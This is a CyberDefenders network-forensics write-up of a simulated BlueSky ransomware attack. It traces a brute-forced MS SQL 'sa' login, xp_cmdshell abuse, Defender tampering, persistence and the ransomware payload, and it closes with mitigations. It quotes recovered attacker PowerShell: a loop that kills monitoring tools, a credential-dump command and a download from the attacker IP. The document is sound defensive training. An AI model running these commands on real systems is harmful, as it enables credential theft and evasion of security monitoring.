# 🛡️ BlueSky Ransomware Writeup

| | |
|---|---|
| **Platform** | CyberDefenders |
| **Difficulty** | Medium |
| **Category** | Network Forensics |
| **Tools** | Wireshark, Windows Event Viewer, VirusTotal, CyberChef |
| **Tactics Covered** | Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Command and Control, Impact |

## 📝 Objective
A corporation suffered a suspected ransomware attack that encrypted key files and disrupted operations. Using a provided PCAP and Windows event logs, the goal was to reconstruct the full attack chain — from initial access through a brute-forced MS SQL account to the deployment of the BlueSky ransomware family — and identify the attacker's IP, credentials, tooling, persistence mechanism, and final payload.

## 🔍 Reconnaissance & Enumeration

**Identifying the scanning source**
Filtered for SYN packets without a corresponding ACK to isolate port scan behavior:

```
tcp.flags.syn==1 and tcp.flags.ack==0
```

This surfaced the attacker's source IP: `87.96.21.84`

**Identifying the targeted service and account**
Wireshark's Protocol Hierarchy Statistics showed traffic over **TDS (Tabular Data Stream)**, the wire protocol for MS SQL. Filtering on TDS login requests:

```
ip.src == 87.96.21.84 && ip.dst == 87.96.21.81 && tds.type == 16
```

revealed the target's desktop name (`DESKTOP-7EQVM78`), which was cross-referenced against Windows Event Logs to confirm the targeted account: **`sa`**

**Recovering the compromised credentials**
```
ip.addr == 87.96.21.84 && tds.7login.username == sa
```

The TDS login packet exposed the plaintext password: **`cyb3rd3f3nd3r$`**

> ⚠️ The `sa` (system administrator) account is a well-known, high-value target for MS SQL brute-force attacks — its compromise gives immediate administrative control over the database engine.

## ⚔️ Exploitation / Action

**1. Enabling command execution**
Following the SQL batch TCP stream showed the attacker enabling **`xp_cmdshell`**, the stored procedure that allows arbitrary OS command execution from within MS SQL — turning database access into full host command execution.

**2. Privilege escalation via process injection**
Filtering Windows Event Logs for **Event ID 400** (PowerShell engine start) and inspecting the `HostApplication` field for anomalies revealed the attacker's C2 was injected into **`winlogon.exe`**, a legitimate system process, to gain administrative-level privileges and blend in with normal system activity.

**3. Initial payload delivery**
```
ip.addr == 87.96.21.84 && http.request.method == "GET"
```

First GET request retrieved: `http://87.96.21.84/checking.ps1`

**4. Environment/privilege checks**
Filtering for the downloaded script and following the HTTP stream:
```
ip.addr == 87.96.21.84 && frame contains "checking.ps1"
```

The script checked for membership in the local **Administrators** group SID: `S-1-5-32-544`

**5. Defense evasion — disabling Windows Defender**
Within the same HTTP stream, the script modified the following registry values, in order:

```
DisableAntiSpyware
DisableRoutinelyTakingAction
DisableRealtimeMonitoring
SubmitSamplesConsent
SpynetReporting
```

**6. Second-stage payload**
```
ip.addr == 87.96.21.84 && http.request.method == "GET"
```

Second GET request retrieved: `http://87.96.21.84/del.ps1`

Following that stream revealed a defense-evasion routine that kills common monitoring/forensic tools before continuing execution:

```powershell
list = "taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
foreach($task in $list)
{
    try {
        stop-process -name $task -Force
    }
    catch {}
}

stop-process $pid -Force
```

This maps to MITRE tactic **TA0005 – Defense Evasion**.

**7. Establishing persistence**
Continuing through the `checking.ps1` HTTP stream and searching for the keyword `task` revealed a scheduled task created for persistence:

```
\Microsoft\Windows\MUI\LPupdate
```

**8. Credential dumping**
Following the HTTP stream for `ichigo-lite.ps1` revealed two Base64-encoded lines. Decoding them showed:
- Line 1: downloads **`Invoke-PowerDump.ps1`**
- Line 2: executes the dump and saves output —

```powershell
Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"
```

Dumped credentials were saved to **`hashes.txt`**.

**9. Network discovery**
The same stream showed the attacker pulling a list of previously discovered hosts for lateral movement:

```powershell
$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" | Select-Object -ExpandProperty Content -ErrorAction Stop
```

Discovered hosts were stored in **`extracted_hosts.txt`**.

## 🚩 The Flag / Conclusion

**Ransomware behavioral analysis**
The attacker's final executable was extracted from an HTTP GET response in the PCAP (`javaw.exe`). Hashing the extracted binary:

```powershell
Get-FileHash -Algorithm SHA256 .\javaw.exe
```

and submitting the hash to VirusTotal's **Behavior → File Dropped** tab confirmed the ransom note dropped on execution:

```
# DECRYPT FILES BLUESKY #
```

> This matches publicly documented BlueSky behavior: the family drops matching `.txt` and `.html` ransom notes with this exact name and appends the `.bluesky` extension to encrypted files — corroborating the sandbox result against known threat intelligence.

**Ransomware family identification**
Submitting the sample / IOCs to **ANY.RUN** confirmed the family: **BlueSky Ransomware**, a Conti-derived strain (sharing traits with Babuk/TargetCompany) first observed in mid-2022, known for multi-threaded ChaCha20/RSA-4096 encryption.

## 🛡️ Defensive Mitigations

1. **Harden MS SQL exposure** — Never expose SQL Server directly to the internet; disable or rename the `sa` account, enforce strong/rotated credentials with account lockout policies, and require MFA or VPN-gated access for remote DB administration. Disable `xp_cmdshell` by default (`sp_configure 'xp_cmdshell', 0`) unless explicitly required.

2. **Detect anomalous process behavior** — Alert on PowerShell (Event ID 400/4104) spawned with an unusual `HostApplication` or parent process (e.g., `winlogon.exe`, `sqlservr.exe`), and flag registry writes to Windows Defender policy keys (`DisableRealtimeMonitoring`, `DisableAntiSpyware`, etc.) as high-severity EDR/SIEM rules.

3. **Monitor scheduled task creation and outbound HTTP to raw IPs** — Alert on new scheduled tasks created under unusual paths (e.g., `\Microsoft\Windows\MUI\`) and on outbound HTTP requests fetching `.ps1` files from non-corporate IP literals, which is a strong indicator of a staged, script-based C2 delivery chain.
